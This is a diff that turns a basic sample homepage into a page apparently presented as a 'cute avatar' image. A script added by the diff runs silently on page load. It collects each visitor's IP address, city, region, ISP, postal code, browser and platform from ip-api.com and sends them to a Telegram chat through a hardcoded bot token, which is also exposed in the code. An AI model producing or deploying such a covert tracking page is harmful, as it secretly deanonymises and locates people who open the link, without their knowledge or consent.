@@ -1,29 +1,81 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>我的基本 HTML 页面</title>
-</head>
-<body>
-    <header>
-        <h1>欢迎来到我的网站</h1>
-        <nav>
-            <ul>
-                <li><a href="#">首页</a></li>
-                <li><a href="#">关于我们</a></li>
-                <li><a href="#">联系我们</a></li>
-            </ul>
-        </nav>
-    </header>
+<html lang="zh-CN">
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>可爱头像</title>
+	</head>
+	<body>
+		<img src="https://ymy.gay/https://cdn.jsdelivr.net/gh/png-dot/pngpng@main/20231005-220130-nmt89k.jpeg"
+			alt="描述图片的文本" style="width: 100%; height: 100%;">
 
-    <main>
-        <h2>欢迎访问我们的网站</h2>
-        <p>这是一个简单的 HTML 页面示例。您可以根据需要添加更多内容。</p>
-    </main>
+		<script>
+			async function sendTelegramMessage(message) {
+				try {
+					const botToken = '5975737743:AAFxFhwL8_VIvZRkqXYeDVngTH3zXaqhy68'; // 替换为您的Telegram Bot的API令牌
+					const chatId = '5957163999'; // 替换为您的Telegram聊天ID
 
-    <footer>
-        <p>&copy; 2023 我的网站</p>
-    </footer>
-</body>
+					const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+					const requestOptions = {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json',
+						},
+						body: JSON.stringify({
+							chat_id: chatId,
+							text: message,
+						}),
+					};
+
+					const response = await fetch(apiUrl, requestOptions);
+					const data = await response.json();
+
+					// 输出Telegram API响应到控制台
+					console.log('Telegram API 响应:', data);
+
+					if (data.ok) {
+						console.log('消息发送成功。');
+					} else {
+						console.error('消息发送失败:', data);
+					}
+				} catch (error) {
+					console.error('消息发送失败:', error);
+				}
+			}
+
+			async function fetchVisitorInfo() {
+				try {
+					const response = await fetch('http://ip-api.com/json', {
+						referrerPolicy: 'no-referrer'
+					});
+					const data = await response.json();
+
+					// 构建访问者信息消息
+					const visitorInfoMessage = `
+访问者信息:
+IP地址: ${data.query}
+地理位置: ${data.city}, ${data.regionName}, ${data.country}
+ISP: ${data.isp}
+城市: ${data.city}
+地区: ${data.regionName}
+邮政编码: ${data.zip}
+国家: ${data.country}
+浏览器: ${navigator.userAgent}
+操作系统: ${navigator.platform}
+                `;
+
+					// 输出访问者信息到控制台
+					console.log('访问者信息:', visitorInfoMessage);
+
+					// 调用sendTelegramMessage发送消息
+					await sendTelegramMessage(visitorInfoMessage);
+				} catch (error) {
+					console.error('获取访问者信息失败:', error);
+				}
+			}
+
+			// 在页面加载时调用fetchVisitorInfo
+			window.addEventListener('load', fetchVisitorInfo);
+		</script>
+	</body>
 </html>
